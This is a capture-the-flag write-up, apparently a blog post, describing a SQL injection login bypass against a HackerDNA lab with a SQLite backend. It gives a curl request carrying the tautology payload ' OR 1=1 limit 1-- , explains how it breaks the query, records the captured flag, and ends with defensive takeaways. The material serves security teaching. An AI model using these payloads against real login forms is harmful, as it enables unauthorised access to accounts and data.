---
layout: post
title: "SQL Injection Test - SQLite Login Bypass with Tautology Payload"
description: "CTF writeup bypassing the SQL Injection Test Lab login with an OR 1=1 limit 1 payload against a real SQLite backend to retrieve the flag."
category: hackerdna
tags: [web, ctf, hackerdna, sqli, sqlite, login-bypass, authentication-bypass]
---

## SQL Injection Test - CTF Writeup

**Category:** WEB | **Flags:** 1

Challenge: [https://hackerdna.com/labs/sql-injection-test](https://hackerdna.com/labs/sql-injection-test)

## Contents

- [Reconnaissance](#reconnaissance)
- [SQL Injection](#sql-injection)
- [Flag](#flag)

## Reconnaissance

Nmap reveals a single open port:

- **80** - HTTP - "SQL Injection Test Lab"

The application is a React-style login portal backed by a real SQLite database. The
login form submits JSON to `/login`:

```bash
curl -X POST "http://TARGET/login" \
  -H "Content-Type: application/json" \
  --data '{"username":"...","password":"..."}'
```

The API response conveniently echoes the executed query, which makes crafting and
validating the injection trivial:

```json
{"flag":"...","message":"Login successful! Welcome, admin",
 "query":"SELECT * FROM users WHERE username = '' AND password = '...'","success":true}
```

## SQL Injection

A tautology payload in the username field bypasses the authentication check. The goal
is to reliably return a single admin row without the login "too many results" guard
tripping:

```bash
curl -X POST "http://TARGET/login" \
  -H "Content-Type: application/json" \
  --data '{"username":"'"'"' OR 1=1 limit 1-- ","password":"x"}'
```

Used payload:

```
username: ' OR 1=1 limit 1-- 
password: ' OR 1=1 limit 1-- 
```

Both fields tolerate the same injection pattern. The `-- ` comments out the trailing
password comparison and `limit 1` guarantees a single row comes back, landing the
authenticated session on the `admin` account.

```
Login successful! Welcome, admin
Flag: be3ae9ed-e2f3-40c2-a0e8-6fc7dffcd79b
```

**Flag:** `be3ae9ed-e2f3-40c2-a0e8-6fc7dffcd79b`

## How the Attack Works

The application executes the raw query shown by the API:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 limit 1-- ' AND password = 'x'
```

- `'` closes the username string literal.
- `OR 1=1` makes the predicate true for every row.
- `limit 1` caps the result set to one user so the login succeeds cleanly.
- `-- ` comments out the rest of the injected password clause.

The application returns `success: true` for anyone whose query returns rows, treating
a non-empty result as successful authentication.

## Key Takeaways

- **Echoed queries make testing trivial** - always use parameterised queries; a
  database should never reveal the query text to clients.
- **`limit 1` prevents row-count side effects** and is a handy stabiliser when
  exploiting multi-row injections.
- **A login that returns the first row by default is a design flaw.** Verify a
  credential match against an explicit user, never "any row returned".
- **SQLite injections behave like MySQL for tautology cases** but differ in
  features - test against the actual DBMS before relying on a payload.